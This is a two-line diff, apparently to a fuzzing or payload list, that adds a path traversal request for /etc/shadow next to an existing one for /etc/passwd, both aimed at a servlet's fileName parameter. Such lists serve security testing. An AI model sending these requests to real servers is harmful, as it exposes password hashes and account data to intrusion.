@@ -1,1 +1,2 @@
 /servlets/FetchFile?fileName=../../../etc/passwd
+/servlets/FetchFile?fileName=../../../etc/shadow
